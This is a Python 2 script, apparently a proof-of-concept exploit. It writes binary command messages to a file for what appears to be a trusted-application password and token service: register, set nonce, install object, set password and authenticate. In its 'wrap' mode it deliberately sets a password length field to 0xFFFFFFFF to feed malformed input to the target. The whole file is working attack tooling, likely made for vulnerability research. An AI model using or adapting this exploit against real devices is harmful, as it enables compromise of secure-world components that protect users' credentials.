#!/usr/bin/python

import struct
import binascii
import sys

def add_dword(b, i):
	p = struct.pack("<I", i)
	for i in range(0, 4):
		b.append(p[i])
	return b

def create_sendmsg_hdr(code, uid, payload_len):
	b = bytearray()
	b = add_dword(b, code)
	b = add_dword(b, uid)
	b = add_dword(b, payload_len + 16) #account for the hdr size (16)
	b = add_dword(b, 0) #unk field
	return b

def create_init_payload():
	b = bytearray()
	b = add_dword(b, 0) #msr length 0 -> no new msr read
	return b


def create_register_payload(slotId, pwd):
	b = bytearray()
	b = add_dword(b, slotId) #slotId
	assert(len(pwd) == 0x80)
	b = add_dword(b, len(pwd))
	b += pwd
	b = add_dword(b, 1) #access_method == TUI_pwd
	return b

def create_set_nonce_payload(slotId, nonceLen):
	b = bytearray()
	assert(nonceLen <= 0x20)
	b = add_dword(b, slotId)
	b = add_dword(b, nonceLen)
	return b

def create_unwrapped_pwd_t(nonce, noncelen, pwd, pwdlen):
	b = bytearray()

	print "nonce len: %d pwd len: %d real pwd len: %d" % (noncelen, pwdlen, len(pwd))
	assert(len(nonce) + len(pwd)) <= 0x20*2

	b = add_dword(b, noncelen)
	b += nonce
	b = add_dword(b, pwdlen)
	b += pwd

	return b

def create_install_obj_payload(obj):

	b = bytearray()
	b += obj
	b += "\x00"*(0x400 - len(obj))
	b = add_dword(b, len(obj))
	return b


def create_set_token_pwd_payload(slotId, wrapped_pwd):
	b = bytearray()
	b = add_dword(b, slotId)
	b += wrapped_pwd
	#now pad it to 0x400
	pad_len = 0x400 - len(wrapped_pwd)
	print "padding len: %d original len: %d" % (pad_len, len(wrapped_pwd))
	b += "\x00"*pad_len
	b = add_dword(b, len(wrapped_pwd))
	#b = add_dword(b, 0xffff0000)
	return b

def create_auth_token_pwd_payload(slotId, wrapped_pwd):
	b = bytearray()
	b = add_dword(b, slotId)
	b += wrapped_pwd
	#now pad it to 0x400
	pad_len = 0x400 - len(wrapped_pwd)
	print "padding len: %d original len: %d" % (pad_len, len(wrapped_pwd))
	b += "\x00"*pad_len
	b = add_dword(b, len(wrapped_pwd))
	#b = add_dword(b, 0xffff0000)
	return b

def serialize_msg(code, payload, filename):

	hdr = create_sendmsg_hdr(code, 0, len(payload))
	msg = hdr + payload
	#print binascii.hexlify(msg)
	with open(filename, "w+") as f:
		f.write(msg)

def create_init_msg():
	payload = create_init_payload()
	serialize_msg(2, payload, "apdu.bin")

def create_register_msg():
	payload = create_register_payload(0, "a"*0x80)
	serialize_msg(25, payload, "apdu.bin")

def create_set_nonce_msg():
	payload = create_set_nonce_payload(0, 0x20)
	serialize_msg(52, payload, "apdu.bin")

def create_install_obj_msg(nonce, valid):
	pwd = "B"*32
	if (valid == 0):
		pwdlen = 0xFFFFFFFF
	else:
		pwdlen = len(pwd)
	noncelen = len(nonce)
 	unwrapped_pwd = create_unwrapped_pwd_t(nonce, noncelen, pwd, pwdlen)
	payload = create_install_obj_payload(unwrapped_pwd)
	serialize_msg(28, payload, "apdu.bin")

def create_set_token_pwd_msg(pwd):
	payload = create_set_token_pwd_payload(0, pwd)
	serialize_msg(51, payload, "apdu.bin")

def create_auth_token_pwd_msg(pwd):
	payload = create_auth_token_pwd_payload(0, pwd)
	serialize_msg(53, payload, "apdu.bin")

if __name__ == "__main__":

	if (sys.argv[1] == "init"):
		create_init_msg()

	if (sys.argv[1] == "reg"):
		create_register_msg()

	if (sys.argv[1] == "nonce"):
		create_set_nonce_msg()

	if (sys.argv[1] == "wrap"):
		nonce = bytearray()
		with open("output.bin", "r") as f:
			nonce = f.read()
		create_install_obj_msg(nonce, 0)

	if (sys.argv[1] == "wrapvalid"):
		nonce = bytearray()
		with open("output.bin", "r") as f:
			nonce =  f.read()
		create_install_obj_msg(nonce, 1)

        if (sys.argv[1] == "setpwd"):
		wrapped_pwd = bytearray()
		with open("output.bin", "r") as f:
			wrapped_pwd = f.read()
		create_set_token_pwd_msg(wrapped_pwd)

	if (sys.argv[1] == "authpwd"):
		wrapped_pwd = bytearray()
		with open("output.bin", "r") as f:
			wrapped_pwd = f.read()
		create_auth_token_pwd_msg(wrapped_pwd)
